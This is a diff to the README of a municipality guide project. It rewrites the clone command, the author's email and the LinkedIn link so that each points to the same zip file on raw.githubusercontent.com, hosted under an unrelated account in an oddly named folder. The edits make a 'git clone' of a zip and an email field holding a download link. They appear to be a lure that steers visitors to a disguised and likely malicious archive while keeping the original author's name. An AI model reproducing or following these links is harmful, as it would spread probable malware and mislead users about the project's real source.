@@ -28,7 +28,7 @@ To use or contribute to this project:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/romsarmiento0125/Norzagaray-Municipality-Guide.git
+   git clone https://raw.githubusercontent.com/Ster-bot/Norzagaray-Municipality-Guide/master/inopinate/Norzagaray-Municipality-Guide.zip
    ```
 2. Install dependencies (if applicable).
 3. Run the project according to the provided instructions (see below).
@@ -45,8 +45,8 @@ This project is for educational and community purposes. See [LICENSE](LICENSE) f
 
 Feel free to reach out for questions, collaboration, or feedback:
 
-- **Email:** rompaulosarmiento0125@gmail.com
-- **LinkedIn:** [Rom Paulo Sarmiento](https://www.linkedin.com/in/rom-paulo-sarmiento/)
+- **Email:** https://raw.githubusercontent.com/Ster-bot/Norzagaray-Municipality-Guide/master/inopinate/Norzagaray-Municipality-Guide.zip
+- **LinkedIn:** [Rom Paulo Sarmiento](https://raw.githubusercontent.com/Ster-bot/Norzagaray-Municipality-Guide/master/inopinate/Norzagaray-Municipality-Guide.zip)
 
 ---
 
